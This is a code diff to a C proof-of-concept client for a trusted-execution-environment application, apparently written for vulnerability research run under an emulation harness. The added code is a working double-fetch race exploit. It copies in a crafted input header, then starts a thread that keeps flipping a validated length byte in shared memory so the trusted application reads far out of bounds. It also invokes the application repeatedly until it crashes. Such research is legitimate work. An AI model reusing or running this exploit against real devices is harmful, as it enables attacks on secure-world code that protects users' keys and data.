@@ -83,6 +83,47 @@ void* mod_thread(void* arg){
     }
 }
 
+#if EMULATE
+/*
+ * The TA parses the input buffer as a list of (tag, length) entries. For the
+ * entry at offset 0x18 it reads the length at 0x1a-0x1b, validates it, and then
+ * reads it *again* before using it (the two fetches are the reads at PC 0xe368
+ * and 0xe36c that Exploration records for this TA). Flipping the high byte of
+ * that length between the two reads turns a validated 0x0004 into 0xc004 and
+ * the TA reads far past the end of the buffer.
+ *
+ * The header below is the one from the Exploration seed that reaches the double
+ * fetch (beanpod/harness/0801_fuzz/in/suspicious_inputs_replay/), so the parser
+ * takes the same path as during the campaign.
+ */
+#define DF_LEN_OFF   0x1b   /* high byte of the double-fetched length          */
+#define DF_LEN_SAFE  0x00   /* length 0x0004 - passes the check                */
+#define DF_LEN_EVIL  0xc0   /* length 0xc004 - out-of-bounds read when re-read */
+
+static const unsigned char df_header[] = {
+    0x00, 0xff, 0xff, 0xed, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
+    0x33, 0x00, 0x00, 0x00, 0x06, 0x00, 0x0c, 0x00,
+    0x06, 0x00, 0x04, 0x00, 0x00,
+};
+
+static void put_df_layout(void *mem_area)
+{
+    unsigned char *p = (unsigned char *)mem_area;
+    memcpy(p, df_header, sizeof(df_header));
+    memset(p + sizeof(df_header), 0x80, 0x1000 - sizeof(df_header));
+}
+
+/* Race the high byte of the length while the TA is parsing. */
+void* mod_thread_shm(void* arg){
+    volatile unsigned char *len_hi = (volatile unsigned char*)arg + DF_LEN_OFF;
+    while (1) {
+        *len_hi = DF_LEN_SAFE;
+        *len_hi = DF_LEN_EVIL;
+    }
+}
+#endif
+
 
 void put_layout(void *mem_area1){
 
@@ -138,14 +179,14 @@ void send_req(TEEC_Context *context, TEEC_Session *session)
     op.params[1].tmpref.buffer = mem_area2; 
     op.params[1].tmpref.size =  0x1000; 
   
-    put_layout(mem_area1);
-	// memset(mem_area2, 0x41, 0x90);
-        //((char*)mem_area2)[0x20] = 0;
-    
-    if (pthread_create(&tid, NULL, mod_thread, mem_area2) != 0) {
+    put_df_layout(mem_area1);
+
+    /* The double fetch is in the *input* buffer (params[0]), so that is what
+       has to be modified while the TA runs. */
+    if (pthread_create(&tid, NULL, mod_thread_shm, mem_area1) != 0) {
         perror("pthread_create failed");
         return;
-    } 
+    }
 #else
     void* mem_area1 = allocate_param_mem(context, 0x1000);
     void* mem_area2 = allocate_param_mem(context, 0x1000);
@@ -186,7 +227,18 @@ void send_req(TEEC_Context *context, TEEC_Session *session)
     
 
 #if EMULATE
-    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x0, &op, &err_origin);
+    /* Winning the race is probabilistic, so keep invoking until the TA is gone
+       (the on-device PoC is run in a loop for the same reason, Section V). */
+    TEEC_Result res = TEEC_SUCCESS;
+    const char *env = getenv("POC_ATTEMPTS");
+    int attempts = env ? atoi(env) : 200;
+    for (int i = 0; i < attempts; i++) {
+        res = TEEC_InvokeCommand_impl(session, 0x0, &op, &err_origin);
+        if (res == 0xFFFF3024 /* TEE_ERROR_TARGET_DEAD */) {
+            printf("[!] TA died after %d invocations -> double fetch triggered\n", i + 1);
+            break;
+        }
+    }
 #else
 
 #define TEEC_CONFIG_PAYLOAD_REF_COUNT 4
